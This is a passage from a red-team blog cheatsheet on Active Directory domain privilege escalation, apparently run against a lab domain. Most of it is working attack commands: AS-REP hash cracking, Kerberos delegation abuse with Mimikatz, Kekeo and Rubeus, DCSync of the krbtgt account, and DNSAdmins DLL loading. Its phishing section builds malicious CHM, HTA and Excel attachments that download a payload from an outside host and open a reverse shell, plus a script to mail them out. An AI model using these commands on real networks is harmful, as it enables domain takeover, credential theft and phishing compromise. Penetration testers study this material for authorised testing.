</span></span></code></pre></div></li><li><p>Using bleeding-jumbo branch of John The Ripper or HashCat, we can brute-force the hashes offline:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># JohnTheRipper (bleeding-jumbo branch)</span>
</span></span><span class=line><span class=cl>/usr/sbin/john --format<span class=o>=</span>krb5asrep --wordlist<span class=o>=</span>./10-million-password-list-top-1000000.txt john_asrep.kirbi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># HashCat</span>
</span></span><span class=line><span class=cl>hashcat -m <span class=m>18200</span> --force hashcat_asrep.kirbi ./10-million-password-list-top-1000000.txt
</span></span></code></pre></div></li></ol><h2 id=unconstrained-delegation>Unconstrained Delegation</h2><p>General/Basic or Unconstrained Delegation which allows the first hop server (e.g. web server) to request access to any service on any computer in the domain.</p><ol><li><p>Discover domain computers which have unconstrained delegation enabled:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-NetComputer</span> <span class=n>-UnConstrained</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADComputer</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>TrustedForDelegation</span> <span class=o>-eq</span> <span class=vm>$True</span><span class=p>}</span><span class=nb>Get-ADUser</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>TrustedForDelegation</span> <span class=o>-eq</span> <span class=vm>$True</span><span class=p>}</span>
</span></span></code></pre></div></li><li><p>Compromise the server(s) where Unconstrained delegation is enabled and trick or wait for a domain admin to connect to the service. We can use the following PowerView command to notify for a particular DA to access a resource on the web server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-UserHunter</span> <span class=n>-ComputerName</span> <span class=s2>&#34;ops-web&#34;</span> <span class=n>-Poll</span> <span class=mf>100</span> <span class=n>-UserName</span> <span class=s2>&#34;Administrator&#34;</span> <span class=n>-Delay</span> <span class=mf>5</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Run following commands on it to check if any DA ticket is available and then export it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;sekurlsa::tickets&#34;&#39;</span><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;sekurlsa::tickets /export&#34;&#39;</span>
</span></span></code></pre></div></li><li><p>The DA ticket could then be reused:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-060a10000-Administrator@krbtgtCYBERLAB.CYBERCORP.LOCAL.kirbi&#34;&#39;</span>
</span></span></code></pre></div></li></ol><h2 id=constrained-delegation>Constrained Delegation</h2><p>Constrained Delegation allows the first hop server (e.g web server) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers <em>Protocol Transition</em> to transition the request to Kerberos.</p><p>To impersonate the user, <strong>Service for User</strong> (<strong>S4U</strong>) extension is used and it provides two extensions:</p><ul><li><strong>Service for User to Self</strong> (<strong>S4U2self</strong>): Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the <em>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</em> - T2A4D UserAccountControl attribute.</li><li><strong>Service for User to Proxy</strong> (<strong>S4U2proxy</strong>): Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by <em>msDS-AllowedToDelegateTo</em> attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.</li></ul><p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it’s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p><p>Enumerate users and computers with constrained delegation enabled:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView_dev</span>
</span></span><span class=line><span class=cl><span class=nb>Get-DomainUser</span> <span class=n>-TrustedToAuth</span>
</span></span><span class=line><span class=cl><span class=nb>Get-DomainComputer</span> <span class=n>-TrustedToAuth</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADObject</span> <span class=n>-Filter</span> <span class=p>{</span><span class=nb>msDS-AllowedToDelegateTo</span> <span class=o>-ne</span> <span class=s2>&#34;</span><span class=nv>$null</span><span class=s2>&#34;</span><span class=p>}</span> <span class=n>-Properties</span> <span class=nb>msDS-AllowedToDelegateTo</span>
</span></span></code></pre></div><h2 id=constrained-delegation-allowed-for-a-user-account>Constrained delegation allowed for a User Account</h2><ol><li><p>To abuse constrained delegation in above scenario, we need to have access to the account for which the constrained delegation is enabled. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of this account as ANY user.</p></li><li><p>Using <em>asktgt</em> from Kekeo, we request a TGT as the abused account. Either plaintext password or NTLM hash of the compromised account (with constrained delegation enabled) is required:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Kekeo
</span></span><span class=line><span class=cl>kekeo# tgt::ask /user:WEBSVC /domain:cyberlab.cybercorp.local /rc4:[NTLM_HASH_USER_ENABLED_DELEGATION]
</span></span></code></pre></div></li><li><p>Using s4u from Kekeo, we request a TGS as ANY user for the service to which the delegation is enabled, e.g. <em>FILESERVER</em>, using the TGT previously obtained:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Kekeo
</span></span><span class=line><span class=cl>kekeo# tgs::s4u /tgt:[TGT_USER_ENABLED_DELEGATION] /user:Administrator@CYBERLAB.CYBERCORP.LOCAL /service:cifs/FILESERVER.CYBERLAB.CYBERCORP.LOCAL
</span></span></code></pre></div></li><li><p>Using mimikatz, inject the TGS ticket:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~FILESERVER.CYBERLAB.CYBERCORP.LOCAL@CYBERLAB.CYBERCORP.LOCAL.kirbi&#34;&#39;</span>
</span></span></code></pre></div></li><li><p>Access the file shares of the target:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>ls </span><span class=p>\\</span><span class=n>fileserver</span><span class=p>.</span><span class=py>cyberlab</span><span class=p>.</span><span class=py>cybercorp</span><span class=p>.</span><span class=n>local</span><span class=p>\</span><span class=n>c</span><span class=p>$</span>
</span></span></code></pre></div><p>Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.</p></li></ol><h2 id=constrained-delegation-allowed-for-a-machine-account>Constrained delegation allowed for a Machine Account</h2><p>If you have compromised a machine account or in other words you have SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.</p><ol><li><p>List services to which the machine account is trusted to delegate to:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-NetComputer</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span><span class=p>,</span> <span class=nb>msds-allowedtodelegateto</span><span class=p>,</span> <span class=n>useraccountcontrol</span> <span class=p>|</span> <span class=nb>fl
</span></span></span><span class=line><span class=cl><span class=nb>Get-NetComputer</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=p>|</span> <span class=nb>Select-Object</span> <span class=n>-ExpandProperty</span> <span class=nb>msds-allowedtodelegateto</span> <span class=p>|</span> <span class=nb>fl
</span></span></span></code></pre></div></li><li><p>Using asktgt from Kekeo, we request a TGT as the abused account (in this case a machine account):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Kekeo
</span></span><span class=line><span class=cl>kekeo# tgt::ask /user:cyberlab-adminsrv$ /domain:CYBERLAB.CYBERCORP.LOCAL /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
</span></span></code></pre></div></li><li><p>Using s4u from Kekeo (no SNAME validation) it is possible to ask for a TGS also for <em>time</em> and <em>ldap</em> services by running other two separate commands (putting both the base service and a single alternative one):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Kekeo
</span></span><span class=line><span class=cl>kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local
</span></span><span class=line><span class=cl>kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp..local /service:cifs/fileserver.cyberlab.cybercorp.local|time/fileserver.cyberlab.cybercorp.local
</span></span><span class=line><span class=cl>kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local|ldap/fileserver.cyberlab.cybercorp.local
</span></span></code></pre></div></li><li><p>Using mimikatz it is possible to inject all the generated TGS tickets (from the previous commands) into the session:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi&#34;&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_time~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&#34;&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ldap~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&#34;&#39;</span>
</span></span></code></pre></div></li><li><p>If we have a ticket for the LDAP service it is possible to perform a DCSync:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;lsadump::dcsync /user:cyberlab\krbtgt&#34;&#39;</span><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;lsadump::dcsync /user:cyberlab\administrator&#34;&#39;</span>
</span></span></code></pre></div></li></ol><p>The same procedure can also be performed by using <code>Rubeus</code>:</p><ol><li><p>Using asktgt from Rubeus, we request a TGT as the abused account (in this case a machine account):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Rubeus</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>Rubeus</span><span class=p>.</span><span class=py>exe</span> <span class=n>asktgt</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=nb>cyberlab-adminsrv</span><span class=p>$</span> <span class=p>/</span><span class=n>domain</span><span class=err>:</span><span class=n>CYBERLAB</span><span class=p>.</span><span class=py>CYBERCORP</span><span class=p>.</span><span class=py>LOCAL</span> <span class=p>/</span><span class=n>rc4</span><span class=err>:</span><span class=n>1fadb1b13edbc5a61cbdc389e6f34c67</span> <span class=p>/</span><span class=n>outfile</span><span class=err>:</span><span class=n>deleg</span><span class=p>.</span><span class=py>kirbi</span>
</span></span></code></pre></div></li><li><p>Using s4u from Rubeus (no SNAME validation) it is possible to ask for a TGS also for <em>time</em> and <em>ldap</em> services (remember to include in the <em>altservice</em> field also the first service):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Rubeus</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>Rubeus</span><span class=p>.</span><span class=py>exe</span> <span class=n>s4u</span> <span class=p>/</span><span class=n>ticket</span><span class=err>:</span><span class=n>deleg</span><span class=p>.</span><span class=py>kirbi</span> <span class=p>/</span><span class=n>impersonateuser</span><span class=err>:</span><span class=n>administrator</span> <span class=p>/</span><span class=n>msdsspn</span><span class=err>:</span><span class=n>cifs</span><span class=p>/</span><span class=nb>cyberlab-dc</span><span class=p>.</span><span class=py>cyberlab</span><span class=p>.</span><span class=py>cybercorp</span><span class=p>.</span><span class=py>local</span> <span class=p>/</span><span class=n>altservice</span><span class=err>:</span><span class=n>cifs</span><span class=p>,</span><span class=n>time</span><span class=p>,</span><span class=n>ldap</span><span class=p>,</span><span class=n>http</span><span class=p>,</span><span class=n>wsman</span><span class=p>,</span><span class=n>host</span><span class=p>,</span><span class=n>rpcss</span> <span class=p>/</span><span class=n>ptt</span>
</span></span></code></pre></div></li></ol><p>An alternative in case of SYSTEM level compromise of a machine with constrained delegation enabled:</p><ol><li><p>Impersonate the Administrator account:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>[</span><span class=no>Reflection.Assembly</span><span class=p>]::</span><span class=n>LoadWithPartialName</span><span class=p>(</span><span class=s1>&#39;System.IdentityModel&#39;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>out-null</span>
</span></span><span class=line><span class=cl><span class=nv>$idToImpersonate</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>Principal</span><span class=p>.</span><span class=py>WindowsIdentity</span> <span class=vm>@</span><span class=p>(</span><span class=s1>&#39;administrator&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$idToImpersonate</span><span class=p>.</span><span class=py>Impersonate</span><span class=p>()[</span><span class=no>System.Security.Principal.WindowsIdentity</span><span class=p>]::</span><span class=n>GetCurrent</span><span class=p>()</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span></code></pre></div></li><li><p>Try to access the service (in case the COMPUTER1 is allowed to delegate to DC CIFS service):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>ls </span><span class=p>\\</span><span class=nb>cyberlab-dc</span><span class=p>.</span><span class=py>cyberlab</span><span class=p>.</span><span class=py>cybercorp</span><span class=p>.</span><span class=n>local</span><span class=p>\</span><span class=n>c</span><span class=p>$</span>
</span></span></code></pre></div></li></ol><h2 id=dnsadmin>DNSAdmin</h2><p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of <em>dns.exe</em> (SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Privileges to restart the DNS service are needed.</p><ol><li><p>Enumerate the members of the DNSAdmis group</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-NetGroupMember</span> <span class=n>-GroupName</span> <span class=s2>&#34;DNSAdmins&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ADGroupMember</span> <span class=n>-Identity</span> <span class=s2>&#34;DNSAdmins&#34;</span>
</span></span></code></pre></div><p>Once we know the members of the DNSAdmins group, we need to compromise a member.</p></li><li><p>Install DNS RSAT tools (if not present):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WindowsCapability</span> <span class=n>-Name</span> <span class=n>RSAT</span><span class=p>*</span> <span class=n>-Online</span> <span class=p>|</span> <span class=nb>Add-WindowsCapability</span> <span class=err>–</span><span class=n>Online</span>
</span></span></code></pre></div></li><li><p>From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># RSAT DNS</span>
</span></span><span class=line><span class=cl><span class=n>dnscmd</span> <span class=nb>cyberlab-dc</span> <span class=p>/</span><span class=n>config</span> <span class=p>/</span><span class=n>serverlevelplugindll</span> <span class=p>\\</span><span class=n>FILESERVER_IP</span><span class=p>\</span><span class=n>dll</span><span class=p>\</span><span class=n>mimilib</span><span class=p>.</span><span class=py>dll</span> <span class=c># Absolute path</span>
</span></span></code></pre></div><p>or using DNSServer module (needs RSAT DNS):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># RSAT DNS</span>
</span></span><span class=line><span class=cl><span class=nv>$dnsettings</span> <span class=p>=</span> <span class=nb>Get-DnsServerSetting</span> <span class=n>-ComputerName</span> <span class=nb>cyberlab-dc</span> <span class=n>-Verbose</span> <span class=n>-All</span>
</span></span><span class=line><span class=cl><span class=nv>$dnsettings</span><span class=p>.</span><span class=py>ServerLevelPluginDll</span> <span class=p>=</span> <span class=s2>&#34;\\FILESERVER_IP\dll\mimilib.dll&#34;</span>  <span class=c># Absolute path</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DnsServerSetting</span> <span class=n>-InputObject</span> <span class=nv>$dnsettings</span> <span class=n>-ComputerName</span> <span class=nb>cyberlab-dc</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>From a CMD shell restart the DNS service (assuming that the DNSAdmins group has the permission to do so):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>sc </span><span class=p>\\</span><span class=nb>cyberlab-dc</span> <span class=n>stop</span> <span class=n>dns</span>
</span></span><span class=line><span class=cl><span class=nb>sc </span><span class=p>\\</span><span class=nb>cyberlab-dc</span> <span class=nb>start </span><span class=n>dns</span>
</span></span></code></pre></div><p>By default, the mimilib.dll logs all DNS queries to <strong>C:\Windows\System32\kiwidns.log</strong></p><p>If you want to implement a custom DLL to perform custom actions (i.e. add a user to the Administrators group), it is possible to use the template present at this link <a href=https://github.com/kazkansouh/DNSAdmin-DLL target=_blank rel=noopener>DNSAdmin-DLL</a>. In fact, the DLL must export predefined functions to be accepted by the DNS service.</p></li></ol><h2 id=phishing>Phishing</h2><p>In order to perform a phishing attack it is necessary to perform the following steps:</p><ol><li><p>Find the mail server by looking at SMTP open ports (25, 587, 465):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>(</span><span class=mf>25</span><span class=p>,</span> <span class=mf>587</span><span class=p>,</span> <span class=mf>465</span><span class=p>)</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span><span class=n>powercat</span> <span class=n>-c</span> <span class=n>smtp</span><span class=p>.</span><span class=py>cyberlab</span><span class=p>.</span><span class=py>local</span> <span class=n>-p</span> <span class=nv>$_</span> <span class=n>-t</span> <span class=mf>1</span> <span class=n>-Verbose</span> <span class=n>-d</span><span class=p>}</span>
</span></span></code></pre></div></li><li><p>Generate a malicious attachment to be sent within the mail message:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Out-CHM</span> <span class=n>-PayloadScript</span> <span class=p>.\</span><span class=nb>Invoke-PowerShellTcp</span><span class=p>.</span><span class=py>ps1</span> <span class=n>-HHCPath</span> <span class=s2>&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Out-CHM</span> <span class=n>-PayloadURL</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>192.168</span><span class=p>.</span><span class=py>50</span><span class=p>.</span><span class=mf>53</span><span class=p>/</span><span class=n>powercat_connect</span><span class=p>.</span><span class=py>ps1</span> <span class=n>-HHCPath</span> <span class=s2>&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Out-CHM</span> <span class=n>-Payload</span> <span class=s2>&#34;-c net localgroup administrators CYBERLAB\STUDENT01 /add&#34;</span> <span class=n>-HHCPath</span> <span class=s2>&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Out-Excel</span> <span class=n>-PayloadURL</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>192.168</span><span class=p>.</span><span class=py>50</span><span class=p>.</span><span class=mf>53</span><span class=p>/</span><span class=n>powercat_connect</span><span class=p>.</span><span class=py>ps1</span> <span class=n>-DDE</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Out-HTA</span> <span class=n>-PayloadURL</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>192.168</span><span class=p>.</span><span class=py>50</span><span class=p>.</span><span class=mf>53</span><span class=p>/</span><span class=n>powercat_connect</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Out-HTA</span> <span class=n>-Payload</span> <span class=s2>&#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c . \\10.10.10.10\tmp\powercat.ps1; powercat -c ws01 -p 443 -e cmd&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Out-HTA</span> <span class=n>-Payload</span> <span class=s2>&#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c net localgroup administrators cyberlab\student01 /add&#34;</span>
</span></span></code></pre></div></li><li><p>Connect to the SMTP server and the send the message to the recipients:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># phishing.ps1</span>
</span></span><span class=line><span class=cl><span class=nv>$recipients</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;lbunce@cyberlab.local&#34;</span><span class=p>,</span><span class=s2>&#34;bschonfelder@cyberlab.local&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$sender</span> <span class=p>=</span> <span class=s2>&#34;giovanni@pecoraro.local&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$subject</span> <span class=p>=</span> <span class=s2>&#34;Important mail&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$body</span> <span class=p>=</span> <span class=s2>&#34;Please open the attachment&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$smtp_server</span> <span class=p>=</span> <span class=s2>&#34;smtp.cyberlab.local&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$smtp_port</span> <span class=p>=</span> <span class=mf>25</span><span class=nv>$attachment_path</span> <span class=p>=</span> <span class=s2>&#34;.\doc.chm&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>Foreach</span> <span class=p>(</span><span class=nv>$rcpt</span> <span class=k>in</span> <span class=nv>$recipients</span><span class=p>)</span> <span class=p>{</span>    
</span></span><span class=line><span class=cl>	<span class=nb>Write-Host</span> <span class=n>-ForegroundColor</span> <span class=n>Yellow</span> <span class=s2>&#34;Sending phishing email to </span><span class=nv>$rcpt</span><span class=s2>&#34;</span>    
</span></span><span class=line><span class=cl>	<span class=nb>Send-MailMessage</span> <span class=n>-To</span> <span class=nv>$rcpt</span> <span class=n>-From</span> <span class=nv>$sender</span> <span class=n>-Subject</span> <span class=nv>$subject</span> <span class=n>-Body</span> <span class=nv>$body</span> <span class=n>-SmtpServer</span> <span class=nv>$smtp_server</span> <span class=n>-Port</span> <span class=nv>$smtp_port</span> <span class=n>-Attachments</span> <span class=nv>$attachment_path</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div></li></ol><h2 id=brute-forcing>Brute-forcing</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># hydra.exe</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>hydra</span><span class=p>.</span><span class=py>exe</span> <span class=n>-L</span> <span class=p>..\</span><span class=n>usernames</span><span class=p>.</span><span class=py>txt</span> <span class=n>-P</span> <span class=p>..\</span><span class=mf>500</span><span class=n>-worst-passwords</span><span class=p>.</span><span class=py>txt</span> <span class=s2>&#34;http-post-form://192.168.2.50:8080/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2FasynchPeople%2F&amp;Submit=Sign+in:Invalid&#34;</span>
</span></span></code></pre></div><hr></div><div class=article-tags><a class="badge badge-light" href=/tag/cheatsheet/>Cheatsheet</a>
<a class="badge badge-light" href=/tag/red-team/>Red Team</a>
<a class="badge badge-light" href=/tag/windows/>Windows</a>
<a class="badge badge-light" href=/tag/active-directory/>Active Directory</a>
<a class="badge badge-light" href=/tag/privilege-escalation/>Privilege Escalation</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0020-domain-privilege-escalation-cheatsheet%2F&text=Domain+Privilege+Escalation+Cheatsheet" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0020-domain-privilege-escalation-cheatsheet%2F&t=Domain+Privilege+Escalation+Cheatsheet" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Domain%20Privilege%20Escalation%20Cheatsheet&body=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0020-domain-privilege-escalation-cheatsheet%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0020-domain-privilege-escalation-cheatsheet%2F&title=Domain+Privilege+Escalation+Cheatsheet" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Domain+Privilege+Escalation+Cheatsheet%20https%3A%2F%2Fwww.peco602.com%2Fpost%2F0020-domain-privilege-escalation-cheatsheet%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0020-domain-privilege-escalation-cheatsheet%2F&title=Domain+Privilege+Escalation+Cheatsheet" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=https://www.peco602.com/><img class="avatar mr-3 avatar-circle" src=/authors/admin/avatar_huf4f2a9d771509e6e0b947acc7d389632_627121_270x270_fill_q75_lanczos_center.jpg alt="Giovanni Pecoraro"></a><div class=media-body><h5 class=card-title><a href=https://www.peco602.com/>Giovanni Pecoraro</a></h5><h6 class=card-subtitle>Senior Security Engineer</h6><p class=card-text>My research interests include space systems, cyber security, signal processing and artificial intelligence.</p><ul class=network-icon aria-hidden=true><li><a href=/#contact><i class="fas fa-envelope"></i></a></li><li><a href=https://twitter.com/Peco602 target=_blank rel=noopener><i class="fab fa-twitter"></i></a></li><li><a href="https://scholar.google.com/citations?user=JSM2EcoAAAAJ" target=_blank rel=noopener><i class="fas fa-google-scholar"></i></a></li><li><a href=https://github.com/Peco602 target=_blank rel=noopener><i class="fab fa-github"></i></a></li><li><a href=https://it.linkedin.com/in/giovanni-pecoraro-078500155 target=_blank rel=noopener><i class="fab fa-linkedin"></i></a></li><li><a href=/uploads/resume.pdf><i class="ai ai-cv"></i></a></li></ul></div></div></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">© 2023 Me. This work is licensed under <a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank>CC BY NC ND 4.0</a></p><p class="powered-by footer-license-icons"><a 